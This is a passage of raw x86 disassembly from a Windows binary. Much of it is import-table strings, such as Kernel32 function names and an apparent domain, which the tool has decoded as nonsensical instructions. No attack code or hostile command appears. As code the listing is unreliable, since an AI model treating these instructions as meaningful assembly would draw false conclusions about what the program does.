  429471:	gs fs push eax
  429474:	imul   esi,DWORD PTR [eax+0x65],0xd4000057
  42947b:	add    cl,BYTE PTR [ecx+0x73]
  42947e:	inc    edx
  42947f:	popa   
  429480:	fs push edx
  429482:	gs popa 
  429484:	fs push eax
  429486:	je     0x4294fa
  429488:	add    BYTE PTR [eax],al
  42948a:	jnp    0x42948e
  42948c:	inc    edi
  42948d:	gs je  0x4294e5
  429490:	jae    0x4294f7
  429492:	jb     0x4294d8
  429494:	gs popaw 
  429497:	jne    0x429505
  429499:	je     0x4294e7
  42949b:	inc    ebx
  42949c:	dec    ecx
  42949d:	inc    esp
  42949e:	add    BYTE PTR [eax],al
  4294a0:	inc    ebp
  4294a1:	add    al,BYTE PTR [edi+0x65]
  4294a4:	je     0x4294f6
  4294a6:	jb     0x429517
  4294a8:	arpl   WORD PTR [ecx+0x64],ax
  4294ab:	fs jb  0x429513
  4294ae:	jae    0x429523
  4294b0:	add    BYTE PTR [eax],al
  4294b2:	mov    BYTE PTR [ebx],0x52
  4294b5:	gs jae 0x42951d
  4294b8:	je     0x4294ff
  4294ba:	jbe    0x429521
  4294bc:	outs   dx,BYTE PTR ds:[esi]
  4294bd:	je     0x4294bf
  4294bf:	add    BYTE PTR [edx+0x656c4300],ch
  4294c5:	popa   
  4294c6:	jb     0x42950b
  4294c8:	outs   dx,DWORD PTR ds:[esi]
  4294c9:	ins    DWORD PTR es:[edi],dx
  4294ca:	ins    DWORD PTR es:[edi],dx
  4294cb:	inc    ebp
  4294cc:	jb     0x429540
  4294ce:	outs   dx,DWORD PTR ds:[esi]
  4294cf:	jb     0x4294d1
  4294d1:	add    BYTE PTR [eax+0x61654802],bh
  4294d7:	jo     0x42952e
  4294d9:	outs   dx,BYTE PTR ds:[esi]
  4294da:	ins    BYTE PTR es:[edi],dx
  4294db:	outs   dx,DWORD PTR ds:[esi]
  4294dc:	arpl   WORD PTR [ebx+0x0],bp
  4294df:	add    dh,ch
  4294e1:	add    edx,DWORD PTR [ebx+0x65]
  4294e4:	je     0x429529
  4294e6:	outs   dx,DWORD PTR ds:[esi]
  4294e7:	ins    DWORD PTR es:[edi],dx
  4294e8:	ins    DWORD PTR es:[edi],dx
  4294e9:	push   ebx
  4294ea:	je     0x42954d
  4294ec:	je     0x429553
  4294ee:	add    BYTE PTR [eax],al
  4294f0:	out    dx,eax
  4294f1:	add    DWORD PTR [edi+0x65],eax
  4294f4:	je     0x42953c
  4294f6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4294fe:	bound  esi,QWORD PTR [ebp+0x74]
  429501:	gs jae 0x429545
  429504:	add    BYTE PTR [eax],al
  429506:	sub    al,0x1
  429508:	inc    ebp
  429509:	outs   dx,BYTE PTR ds:[esi]
  42950a:	jne    0x429579
  42950c:	push   ebx
  42950d:	jns    0x429582
  42950f:	je     0x429576
  429511:	ins    DWORD PTR es:[edi],dx
  429512:	dec    esp
  429513:	outs   dx,DWORD PTR ds:[esi]
  429514:	arpl   WORD PTR [ecx+0x6c],sp
  429517:	gs jae 0x42955b
  42951a:	add    BYTE PTR [eax],al
  42951c:	sub    eax,0x74655304
  429521:	dec    esp
  429522:	outs   dx,DWORD PTR ds:[esi]
  429523:	arpl   WORD PTR [ecx+0x6c],sp
  429526:	push   esp
  429527:	imul   ebp,DWORD PTR [ebp+0x65],0x1240000
  42952e:	inc    ebp
  42952f:	outs   dx,BYTE PTR ds:[esi]
  429530:	jne    0x42959f
  429532:	push   edx
  429533:	gs jae 0x4295a5
  429536:	jne    0x4295aa
  429538:	arpl   WORD PTR [ebp+0x4e],sp
  42953b:	popa   
  42953c:	ins    DWORD PTR es:[edi],dx
  42953d:	gs jae 0x429597
  429540:	add    BYTE PTR [eax],al
  429542:	imul   eax,DWORD PTR [esp+edx*2],0x7246736c
  429549:	gs add BYTE PTR gs:[ebx],ah
  42954d:	add    al,0x53
  42954f:	gs je  0x429598
  429552:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  42955a:	gs jb  0x42955d
  42955d:	add    BYTE PTR [edi+0x1],ch
  429560:	inc    esi
  429561:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  429568:	jne    0x4295dc
  42956a:	arpl   WORD PTR [ebp+0x41],sp
  42956d:	add    BYTE PTR ds:0x6c654401,al
  429573:	gs je  0x4295db
  429576:	inc    esi
  429577:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x4701a400
  42957f:	gs je  0x4295c5
  429582:	outs   dx,DWORD PTR ds:[esi]
  429583:	ins    DWORD PTR es:[edi],dx
  429584:	jo     0x4295fb
  429586:	je     0x4295ed
  429588:	jb     0x4295d8
  42958a:	popa   
  42958b:	ins    DWORD PTR es:[edi],dx
  42958c:	gs inc ebp
  42958e:	js     0x4295d1
  429590:	add    BYTE PTR [eax],al
  429592:	cmp    BYTE PTR [ebx],al
  429594:	dec    ebp
  429595:	outs   dx,DWORD PTR ds:[esi]
  429596:	jbe    0x4295fd
  429598:	inc    esi
  429599:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52454b00
  4295a1:	dec    esi
  4295a2:	inc    ebp
  4295a3:	dec    esp
  4295a4:	xor    esi,DWORD PTR [edx]
  4295a6:	cs fs ins BYTE PTR es:[edi],dx
  4295a9:	ins    BYTE PTR es:[edi],dx
  4295aa:	add    BYTE PTR [eax],al
  4295ac:	add    BYTE PTR [eax],al
  4295ae:	add    BYTE PTR [eax],al
  4295b0:	sbb    DWORD PTR [edx],esp
  4295b2:	add    al,BYTE PTR [eax]
	...
  4295d0:	jmp    0x429567
  4295d2:	add    al,BYTE PTR [eax]
	...
  4295e0:	imul   esp,DWORD PTR fs:[edx+0x6f],0x632e6661
  4295e8:	outs   dx,DWORD PTR ds:[esi]
  4295e9:	ins    DWORD PTR es:[edi],dx
  4295ea:	add    BYTE PTR [ebx+0x72],al
  4295ed:	je     0x429643
  4295ef:	push   0x64616572
  4295f4:	inc    ebp
  4295f5:	js     0x429638
  4295f7:	inc    eax
  4295f8:	cmp    BYTE PTR [eax],al
